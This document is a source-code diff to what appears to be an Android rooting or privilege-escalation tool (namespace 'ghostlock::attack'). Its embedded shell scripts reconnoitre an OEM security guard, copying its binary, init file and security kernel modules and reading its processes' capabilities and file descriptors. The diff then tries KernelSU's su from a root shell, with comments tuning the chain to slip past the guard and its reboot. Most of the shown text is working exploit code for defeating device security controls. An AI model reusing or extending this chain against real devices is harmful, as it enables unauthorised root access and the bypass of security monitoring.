@@ -583,6 +583,7 @@ namespace ghostlock::attack {
              * permissive. Read-only: it starts nothing, signals nothing and
              * changes no state. */
             "guard_probe() {\n"
+            "  gp_t0=$(date +%%s)\n"
             "  gp_dir=/data/local/tmp/ghostlock-guard-$$\n"
             "  mkdir -p \"$gp_dir\" 2>/dev/null\n"
             "  echo 'GUARD-PROBE-BEGIN'\n"
@@ -596,26 +597,32 @@ namespace ghostlock::attack {
             "    echo '--- kallsyms rootcheck ---';\n"
             "    grep -iE 'rootcheck|oem_exec_gate' /proc/kallsyms 2>/dev/null | head -n 20;\n"
             "  } >\"$gp_dir/kallsyms.txt\" 2>&1\n"
-            "  for gp_p in /proc/[0-9]*; do\n"
-            "    gp_pid=${gp_p#/proc/}\n"
-            "    gp_nm=$(cat \"$gp_p/comm\" 2>/dev/null) || continue\n"
-            "    case \"$gp_nm\" in\n"
-            "      qsguard|*securityguard*|*phonemanager*)\n"
-            "        { echo \"pid=$gp_pid comm=$gp_nm owner=$(stat -c %%u $gp_p 2>/dev/null) ctx=$(cat $gp_p/attr/current 2>/dev/null)\";\n"
-            "          echo \"  cmd=$(tr '\\0' ' ' < $gp_p/cmdline 2>/dev/null | cut -c1-160)\";\n"
-            "          grep -E '^(CapEff|CapPrm|Threads|SigCgt)' $gp_p/status 2>/dev/null;\n"
-            "          echo '  fds:';\n"
-            "          ls -l $gp_p/fd 2>/dev/null | tail -n +2 | head -n 25;\n"
-            "        } >>\"$gp_dir/procs.txt\" 2>&1 ;;\n"
-            "    esac\n"
+            /* One ps, then only the handful of matching pids. Walking all of
+             * /proc with a subshell per entry costs seconds on a loaded phone,
+             * and this stage runs before the policy fixup, so it must stay
+             * cheap: the chain's own script timeout is what pays for it. */
+            "  gp_pids=$(ps -A -o PID,NAME 2>/dev/null | grep -E 'qsguard|securityguard|phonemanager' | awk '{print $1}')\n"
+            "  for gp_pid in $gp_pids; do\n"
+            "    gp_p=/proc/$gp_pid\n"
+            "    { echo \"pid=$gp_pid comm=$(cat $gp_p/comm 2>/dev/null) owner=$(stat -c %%u $gp_p 2>/dev/null) ctx=$(cat $gp_p/attr/current 2>/dev/null)\";\n"
+            "      echo \"  cmd=$(tr '\\0' ' ' < $gp_p/cmdline 2>/dev/null | cut -c1-160)\";\n"
+            "      grep -E '^(CapEff|CapPrm|Threads|SigCgt)' $gp_p/status 2>/dev/null;\n"
+            "      echo '  fds:';\n"
+            "      ls -l $gp_p/fd 2>/dev/null | tail -n +2 | head -n 25;\n"
+            "    } >>\"$gp_dir/procs.txt\" 2>&1\n"
             "  done\n"
             "  cp /system_ext/bin/qsguard \"$gp_dir/qsguard.bin\" 2>/dev/null\n"
             "  cp /system_ext/etc/init/qsguard.rc \"$gp_dir/qsguard.rc\" 2>/dev/null\n"
-            "  pm path com.coloros.securityguard >\"$gp_dir/pkg.txt\" 2>&1\n"
-            "  pm path com.coloros.phonemanager >>\"$gp_dir/pkg.txt\" 2>&1\n"
+            "  cp /vendor/lib/modules/oplus_security_guard.ko \"$gp_dir/\" 2>/dev/null\n"
+            "  cp /vendor/lib/modules/oplus_secure_harden.ko \"$gp_dir/\" 2>/dev/null\n"
+            "  cp /vendor/lib/modules/oplus_security_keventupload.ko \"$gp_dir/\" 2>/dev/null\n"
+            /* pm talks to the package service and can stall; bound it so a slow
+             * system_server cannot hold the chain. */
+            "  timeout 4 pm path com.coloros.securityguard >\"$gp_dir/pkg.txt\" 2>&1\n"
+            "  timeout 4 pm path com.coloros.phonemanager >>\"$gp_dir/pkg.txt\" 2>&1\n"
             "  chmod 755 \"$gp_dir\" 2>/dev/null\n"
             "  chmod 644 \"$gp_dir\"/* 2>/dev/null\n"
-            "  echo \"[*] guard probe: artifacts=$(ls \"$gp_dir\" 2>/dev/null | tr '\\n' ' ') qsguard=$( [ -f \"$gp_dir/qsguard.bin\" ] && wc -c <\"$gp_dir/qsguard.bin\" 2>/dev/null || echo 0 ) bytes\" >>\"$LOG\"\n"
+            "  echo \"[*] guard probe: elapsed=$(( $(date +%%s) - gp_t0 ))s artifacts=$(ls \"$gp_dir\" 2>/dev/null | tr '\\n' ' ') qsguard=$( [ -f \"$gp_dir/qsguard.bin\" ] && wc -c <\"$gp_dir/qsguard.bin\" 2>/dev/null || echo 0 ) bytes\" >>\"$LOG\"\n"
             "  echo \"GUARD-PROBE-DIR $gp_dir\"\n"
             "  echo 'GUARD-PROBE-END'\n"
             "  return 0\n"
@@ -928,6 +935,26 @@ namespace ghostlock::attack {
             "fi\n"
             /* The bind mount was detached inside run_late_load; the EXIT trap
              * is the backstop if this shell is killed mid-attempt. */
+            /* Measured 2026-11-15: the module loads and the manager is crowned,
+             * but KernelSU's userspace half never lands (install=0) -- the ksud
+             * daemon dies after init_module while this shell, already uid 0,
+             * keeps running. Record what install left behind, then try the one
+             * thing the guard has not been observed to stop: su from a shell
+             * that is already root. A kill here costs a reboot 15 s later, so
+             * both the dump and the verdict are written before the attempt. */
+            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
+            "  echo 'ADB-DUMP-BEGIN'\n"
+            "  ls -la /data/adb 2>&1 | head -n 15\n"
+            "  ls -la /data/adb/ksu/bin 2>&1 | head -n 10\n"
+            "  echo 'ADB-DUMP-END'\n"
+            "  if [ \"$KSU_READY\" -eq 1 ] && [ -x \"$KSUD\" ]; then\n"
+            "    echo 'SU-PROBE-BEGIN'\n"
+            "    su_out=$(echo id | \"$KSUD\" debug su 2>&1); su_rc=$?\n"
+            "    echo \"$su_out\" | head -n 5\n"
+            "    echo \"SU-PROBE-RC=$su_rc\"\n"
+            "    echo 'SU-PROBE-END'\n"
+            "  fi\n"
+            "fi\n"
             "umount -l /system/bin/lmkd 2>/dev/null\n"
             /* The throne tracker crowns the manager during kernelsu_init. When
              * the APK signature does not match the module's hardened hash the
